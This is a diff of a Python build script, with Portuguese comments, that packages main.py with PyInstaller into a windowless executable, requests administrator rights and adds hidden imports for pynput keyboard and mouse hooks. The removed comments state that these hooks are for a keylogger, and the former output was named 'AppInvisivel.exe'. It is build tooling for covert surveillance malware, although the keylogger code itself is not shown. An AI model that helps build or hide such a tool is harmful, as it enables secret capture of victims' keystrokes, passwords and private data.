@@ -8,19 +8,26 @@ def compile_main():
         print("PyInstaller não está instalado. Instalando...")
         subprocess.run(["pip", "install", "pyinstaller"], check=True)
 
-    command = ["pyinstaller", "--onefile", "--noconsole", "--name=Build", "main.py"]
+    command = [
+        "pyinstaller",
+        "--onefile",
+        "--noconsole",
+        "--name=Build",
+        "main.py",
+        "--add-data", "config.json;."  # Adiciona o arquivo config.json
+    ]
 
     command.extend([
-        "--windowed",  # msm q no console, só que mais uma validação
-        "--uac-admin",  #req admin privlgs
-        "--hidden-import=pynput.keyboard._win32",  # Importação oculta para pynput (Posteriormente Sera usado no keylogger)
-        "--hidden-import=pynput.mouse._win32",     # Importação oculta para pynput (Posteriormente Sera usado no keylogger)
+        "--windowed",  # msm que no console, só que mais uma validação
+        "--uac-admin",  # req admin privlgs
+        "--hidden-import=pynput.keyboard._win32",  # Importação oculta para pynput
+        "--hidden-import=pynput.mouse._win32",     # Importação oculta para pynput
     ])
 
     try:
         subprocess.run(command, check=True)
         print("Build criada.")
-        print("O executável 'AppInvisivel.exe' foi criado na pasta 'dist'.")
+        print("O executável 'Build.exe' foi criado na pasta 'dist'.")
     except subprocess.CalledProcessError as e:
         print(f"Erro durante a compilação: {e}")
 
